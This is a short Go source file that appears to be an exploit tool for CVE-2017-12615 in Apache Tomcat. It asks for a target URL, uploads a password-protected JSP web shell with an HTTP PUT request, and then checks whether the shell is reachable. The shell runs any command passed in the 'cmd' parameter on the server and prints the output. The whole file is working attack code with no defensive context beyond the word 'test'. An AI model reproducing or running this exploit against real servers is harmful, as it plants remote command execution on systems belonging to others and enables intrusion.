package main

import (
	"bufio"
	"fmt"
	"net/http"
	"os"
	"strings"
)

func CVE_2017_12615() {
	fmt.Println("[*] CVE-2017-12615 test starting")

	fmt.Println("[*] shell: http://127.0.0.1/shell.jsp?pwd=shell&cmd=ls")
	reader1 := bufio.NewReader(os.Stdin)
	fmt.Print("[*] input url:")
	url, _, err := reader1.ReadLine()
	if err != nil {
		panic(err)
	}

	data := `<%
    if("shell".equals(request.getParameter("pwd"))){
    	java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    }
%>`
	var client http.Client
	url1 := string(url) + "/shell.jsp/"
	req1, err := http.NewRequest("PUT", string(url1), strings.NewReader(data))
	req1.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36")
	client.Do(req1)
	url2 := string(url) + "/shell.jsp"
	rsp1, err := http.Get(url2)
	fmt.Println(rsp1.Status)
	res := strings.Contains(rsp1.Status, "200")
	if res {
		fmt.Printf("[+] successfully url: %s", url2)
	} else {
		fmt.Println("[-] input shell.jsp failure")
	}
}
